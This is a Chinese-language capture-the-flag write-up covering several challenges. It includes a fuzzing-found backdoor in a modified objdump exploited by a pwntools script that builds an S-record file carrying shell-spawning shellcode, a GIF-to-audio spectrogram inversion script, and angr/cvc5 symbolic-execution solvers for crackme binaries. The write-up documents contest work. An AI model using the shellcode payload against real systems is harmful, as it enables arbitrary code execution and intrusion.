按题目描述，丢个ls进去，找来binutils，把objdump的test都丢进去（make check后临时文件夹里都是，可以把删除临时文件的代码删了），再丢几个随机文件。

几个小时之后（可能test放多了？）得到一个hang几个crash。

优先看crash。

发现srec_scan_helper是一个源码里没有的函数，很可疑。

IDA F5打不开，直接看汇编。

大意是一种神奇的S文件，进入特定分支后会调用srec_scan_helper，srec_scan_helper会读一定字符的内容到回车，然后直接跳转到读取的buf上去了。

在buf直接写shellcode？

WSL下直接给我SegFault了。

不过好像docker下能跑？stack没有NX。

shellcode生成代码如下，base64后直接手动提交上去。

```python
from pwn import *

context(arch = 'amd64', os = 'linux') # , log_level = 'debug'

code = shellcraft.sh()
code = b'S10000' + asm(code) + b"\n"
open('shellcode', 'wb').write(code)
quit()
```

## p😭q

大意是转成频谱后生成每个时刻图片再写到gif里。

每一步都是可逆的。可以用寻找消失的电波里的音频做正变换，这样每一步都能调试正确性了。

librosa 的部分直接在文档里找反函数。

转图片的地方就一层一层拆开来再反过来。可能丢失精度但问题不大。

write_gif 的库竟然不给 read 函数，网上找个读 gif 的代码，发现有数组两个维度交换一下后大差不差。

还原代码：

```python
#!/usr/bin/env python3

from array2gif import write_gif  # version: 1.0.4
import librosa  # version: 0.8.1
import numpy  # version: 1.19.5
import soundfile as sf
import PIL, os, code
from PIL import Image
import numpy as np

num_freqs = 32
quantize = 2
min_db = -60
max_db = 30
fft_window_size = 2048
frame_step_size = 512
window_function_type = 'hann'
red_pixel = [255, 0, 0]
white_pixel = [255, 255, 255]

def get_avg_fps(PIL_Image_object):
    """ Returns the average framerate of a PIL Image object """
    PIL_Image_object.seek(0)
    frames = duration = 0
    while True:
        try:
            frames += 1
            duration += PIL_Image_object.info['duration']
            PIL_Image_object.seek(PIL_Image_object.tell() + 1)
        except EOFError:
            return frames / duration * 1000

def readGif(filename, asNumpy=True):
    """ readGif(filename, asNumpy=True)
    
    Read images from an animated GIF file.  Returns a list of numpy 
    arrays, or, if asNumpy is false, a list if PIL images.
    
    """
    
    # Check PIL
    if PIL is None:
        raise RuntimeError("Need PIL to read animated gif files.")
    
    # Check Numpy
    if np is None:
        raise RuntimeError("Need Numpy to read animated gif files.")
    
    # Check whether it exists
    if not os.path.isfile(filename):
        raise IOError('File not found: '+str(filename))
    
    # Load file using PIL
    pilIm = PIL.Image.open(filename)    
    pilIm.seek(0)
    
    # Read all images inside
    images = []
    try:
        while True:
            # Get image as numpy array
            tmp = pilIm.convert() # Make without palette
            a = np.asarray(tmp)
            if len(a.shape)==0:
                raise MemoryError("Too little memory to convert PIL image to array")
            # Store, and next
            images.append(a)
            pilIm.seek(pilIm.tell()+1)
    except EOFError:
        pass
    
    # Convert to normal PIL images if needed
    if not asNumpy:
        images2 = images
        images = []
        for im in images2:            
            images.append( PIL.Image.fromarray(im) )
    
    # Done
    return get_avg_fps(pilIm), np.array(images).transpose(0, 2, 1, 3)

print('Stage 1')
fps, gif_data = readGif("flag.gif")
sample_rate = int(frame_step_size * fps)

print('Stage 2')
# gif_data = numpy.load("gif_data.npy")
spectrogram_arr = []
for frame_data in gif_data:
    i = 0
    frame = []
    ffd = numpy.array([[w for j, w in enumerate(v) if j % 2] for i, v in enumerate(frame_data) if i % 2])
    for freq in range(num_freqs * 2 + 1):
        if freq % 2 == 0:
            i += 1
            continue
        least = min_db
        j = 0
        for threshold in list(range(min_db, max_db + 1, quantize))[::-1]:
            if (ffd[i][j] == red_pixel).all():
                least = max(least, threshold + 1)
            else:
                assert (ffd[i][j] == white_pixel).all()
            j += 1
        assert freq // 2 == len(frame)
        frame.append(least)
        i += 1

    frame = np.array(frame)
    spectrogram_arr.append(frame)

spectrogram = np.array(spectrogram_arr).transpose().astype(np.float32) 
# -> for stage 2
# numpy.kron(_, numpy.ones([quantize, quantize, 1]))
# numpy.array(_)
# [_ for freq in range(num_freqs * 2 + 1)]
# [_ for threshold in list(range(min_db, max_db + 1, quantize))[::-1]]
# red_pixel if freq % 2 and round(frame[freq // 2]) > threshold else white_pixel

# debugger
# import code
# code.interact(local = locals())

print('Stage 3')
# spectrogram = numpy.load("spectrogram.npz.npy")
# sample_rate = int(frame_step_size * 50)
backed = librosa.db_to_power(spectrogram)
y = librosa.feature.inverse.mel_to_audio(backed, sr = sample_rate, n_fft=fft_window_size, hop_length=frame_step_size, window=window_function_type)

sf.write('flag.wav', y, sample_rate)
```

听力就不做了（寝室播放寻找消失的电波估计舍友都把我当sb了），丢个音频识别程序直接得到数字。

## Make a wish

似乎是触发特定次数的随机数后许愿？完全不会。

## 超 OI 的 Writeup 模拟器

根据文档现学 angr。

### 第一节

直接改一个例子即可。

```python
import angr
from angr.sim_state import SimState
import claripy
import time
import sys

def main(name):
    p = angr.Project(name)

    flag_chars = [claripy.BVS('flag_%d' % i, 8) for i in range(16)]
    flag = claripy.Concat(*flag_chars + [claripy.BVV(b'\n')])

    st = p.factory.full_init_state(
        args=['./' + name],
        add_options=angr.options.unicorn,
        stdin=flag, remove_options={angr.options.LAZY_SOLVES}
    )
    #for k in flag_chars:
    #    st.solver.add(k != 0)
    #    st.solver.add(k != 10)

    sm = p.factory.simulation_manager(st)
    sm.explore(find = 0x4015E8)
    print(sm)
    sm.run()

    out = b''
    for pp in sm.deadended:
        out = pp.posix.dumps(1)
        if b'Correct code' in out:
            return pp.posix.dumps(0)
    return '!'

if __name__ == "__main__":
    before = time.time()
    print(main('0.bin'))
    after = time.time()
    print("Time elapsed: {}".format(after - before))

# flag{ESREVER_d11d7711994d86fe}
```

### 第二节

跑完全流程负荷太大，就跑check函数。

```python
import angr
import sys
import logging
import time

logging.getLogger('angr').setLevel('ERROR')
logging.getLogger('cle').setLevel('ERROR')

before = time.time()

fn = sys.argv[1]# './6.bin'

with open(fn, 'rb') as f:
    cc = f.read()

offset = cc.find(b'\x50\x48\x89\xF1\x48\x89\xFA\x48\xBF')

p=angr.Project(fn, auto_load_libs=False)
addr = p.loader.main_object.offset_to_addr(offset)
print('pos:', hex(addr))
state = p.factory.blank_state(addr = addr, add_options = {}) # , remove_options={angr.options.LAZY_SOLVES}
#u1 = [state.solver.BVS('v1_%d' % i, 8) for i in range(8)]
#u2 = [state.solver.BVS('v2_%d' % i, 8) for i in range(8)]
state.regs.rsi = v1 = state.solver.BVS('v1', 64) # state.solver.Concat(*u1)
state.regs.rdi = v2 = state.solver.BVS('v2', 64) # state.solver.Concat(*u2)
def is_alnum(state, c):
    # set some constraints on the char, let it
    # be a null char or alphanumeric
    is_num = state.solver.And(c >= ord("0"), c <= ord("9"))
    is_alpha_lower = state.solver.And(c >= ord("a"), c <= ord("z"))
    is_alpha_upper = state.solver.And(c >= ord("A"), c <= ord("Z"))
    isalphanum = state.solver.Or(
        is_num, is_alpha_lower, is_alpha_upper)
    return isalphanum

#for i in range(8):
#    state.add_constraints(is_alnum(state, u1[i]))

#for i in range(8):
#    state.add_constraints(is_alnum(state, u2[i]))

simgr=p.factory.simgr(state)
res = simgr.explore(find = addr + 0x21)
found = res.found[0]
found.add_constraints(found.regs.rax == 0)
ans = found.solver.eval(v2).to_bytes(8, byteorder = 'little') + found.solver.eval(v1).to_bytes(8, byteorder = 'little')
print(ans)
after = time.time()
print("Time elapsed: {}".format(after - before))
import json
with open('ans.json', 'r') as f:
    j = json.load(f)

j[fn] = ans.decode('utf-8')

with open('ans.json', 'w') as f:
    json.dump(j, f)
```

### 第三节

发现前面的负荷还是太大。找了一堆教程都是用来剪枝的，但是这里本来就只用一条路径。

看了半天angr源码发现可以把SMT文件导出，然后丢给前面flag推荐的最新的cvc5去跑，貌似就可以了？

```python
import angr
import sys
import logging
import time
import subprocess

logging.getLogger('angr').setLevel('ERROR')
logging.getLogger('cle').setLevel('ERROR')

before = time.time()

fn = sys.argv[1]# './6.bin'

with open(fn, 'rb') as f:
    cc = f.read()

offset = cc.find(b'\x50\x48\x89\xF1\x48\x89\xFA\x48\xBF')

p=angr.Project(fn, auto_load_libs=False)
addr = p.loader.main_object.offset_to_addr(offset)
print('pos:', hex(addr))
cnt = 0
def my_hook(state):
    global cnt
    cnt += 1
    #print(state.regs.rdi ^ state.regs.rsi)
    state.history.trim()
    if cnt % 5 == 0:
        print("hello", cnt)

p.hook(addr=0x401160, hook=my_hook)

#def my_hook2(state):
#    print("MARK!")

#p.hook(addr=0x401754, hook=my_hook2)
state = p.factory.blank_state(addr = addr, add_options = {}, remove_options=angr.options.simplification) # , remove_options={angr.options.LAZY_SOLVES}
#u1 = [state.solver.BVS('v1_%d' % i, 8) for i in range(8)]
#u2 = [state.solver.BVS('v2_%d' % i, 8) for i in range(8)]
state.regs.rsi = v1 = state.solver.BVS('v1', 64) # state.solver.Concat(*u1)
state.regs.rdi = v2 = state.solver.BVS('v2', 64) # state.solver.Concat(*u2)
def is_alnum(state, c):
    # set some constraints on the char, let it
    # be a null char or alphanumeric
    is_num = state.solver.And(c >= ord("0"), c <= ord("9"))
    is_alpha_lower = state.solver.And(c >= ord("a"), c <= ord("z"))
    is_alpha_upper = state.solver.And(c >= ord("A"), c <= ord("Z"))
    isalphanum = state.solver.Or(
        is_num, is_alpha_lower, is_alpha_upper)
    return isalphanum

#for i in range(8):
#    state.add_constraints(is_alnum(state, u1[i]))

#for i in range(8):
#    state.add_constraints(is_alnum(state, u2[i]))

simgr=p.factory.simgr(state)
res = simgr.explore(find = addr + 0x21)
found = res.found[0]
print(len(simgr.active), len(simgr.found), simgr.found[0].regs.pc)
found.add_constraints(found.regs.rax == 0)

smt2_code = list(found.solver._stored_solver._unchecked_solvers)[0]._get_solver().to_smt2()
with open(fn + "smt.smt", "w") as f:
    f.write(smt2_code + "\n(get-model)\n")
p = subprocess.Popen(['./cvc5-2021-09-30-x86_64-linux-opt', '-q', '--lang=smt', '--produce-model', fn + 'smt.smt'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
out, err = p.communicate()
x = out.decode('utf-8')
print(x)
r2 = int(x.split('(define-fun v2')[1].split('#b')[1].split(')')[0], 2)
r1 = int(x.split('(define-fun v1')[1].split('#b')[1].split(')')[0], 2)
ans = r2.to_bytes(8, byteorder = 'little') + r1.to_bytes(8, byteorder = 'little')

print(ans)
after = time.time()
print("Time elapsed: {}".format(after - before))

with open(fn + '.key', 'wb') as f:
    f.write(ans)

import json
with open('ans.json', 'r') as f:
    j = json.load(f)

j[fn] = ans.decode('utf-8')

with open('ans.json', 'w') as f:
    json.dump(j, f)
```

最后也没跑完，不知正确与否。

PS: 貌似也不是正确的思路呢。

